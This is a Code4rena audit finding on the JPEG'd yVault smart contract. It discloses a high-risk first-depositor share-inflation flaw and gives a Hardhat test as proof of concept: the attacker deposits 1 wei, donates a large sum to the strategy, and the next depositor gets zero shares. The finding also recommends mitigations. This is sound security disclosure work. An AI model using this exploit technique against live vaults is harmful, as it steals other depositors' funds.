## Tags

- bug
- 3 (High Risk)
- disagree with severity
- resolved
- sponsor confirmed

# [yVault: First depositor can break minting of shares](https://github.com/code-423n4/2022-04-jpegd-findings/issues/12) 

# Lines of code

https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/yVault.sol#L148-L153


# Vulnerability details

## Details

The attack vector and impact is the same as [TOB-YEARN-003](https://github.com/yearn/yearn-security/blob/master/audits/20210719_ToB_yearn_vaultsv2/ToB_-_Yearn_Vault_v_2_Smart_Contracts_Audit_Report.pdf), where users may not receive shares in exchange for their deposits if the total asset amount has been manipulated through a large “donation”.

## Proof of Concept

- Attacker deposits 1 wei to mint 1 share
- Attacker transfers exorbitant amount to the `StrategyPUSDConvex` contract to greatly inflate the share’s price. Note that the strategy deposits its entire balance into Convex when its `deposit()` function is called.
- Subsequent depositors instead have to deposit an equivalent sum to avoid minting 0 shares. Otherwise, their deposits accrue to the attacker who holds the only share.

Insert this test into [`yVault.ts`](https://github.com/code-423n4/2022-04-jpegd/blob/main/tests/yVault.ts).

```jsx
it.only("will cause 0 share issuance", async () => {
  // mint 10k + 1 wei tokens to user1
  // mint 10k tokens to owner
  let depositAmount = units(10_000);
  await token.mint(user1.address, depositAmount.add(1));
  await token.mint(owner.address, depositAmount);
  // token approval to yVault
  await token.connect(user1).approve(yVault.address, 1);
  await token.connect(owner).approve(yVault.address, depositAmount);
  
  // 1. user1 mints 1 wei = 1 share
  await yVault.connect(user1).deposit(1);
  
  // 2. do huge transfer of 10k to strategy
  // to greatly inflate share price (1 share = 10k + 1 wei)
  await token.connect(user1).transfer(strategy.address, depositAmount);
  
  // 3. owner deposits 10k
  await yVault.connect(owner).deposit(depositAmount);
  // receives 0 shares in return
  expect(await yVault.balanceOf(owner.address)).to.equal(0);

  // user1 withdraws both his and owner's deposits
  // total amt: 20k + 1 wei
  await expect(() => yVault.connect(user1).withdrawAll())
    .to.changeTokenBalance(token, user1, depositAmount.mul(2).add(1));
});
```

## Recommended Mitigation Steps

- [Uniswap V2 solved this problem by sending the first 1000 LP tokens to the zero address](https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L119-L124). The same can be done in this case i.e. when `totalSupply() == 0`, send the first min liquidity LP tokens to the zero address to enable share dilution.
- Ensure the number of shares to be minted is non-zero: `require(_shares != 0, "zero shares minted");`

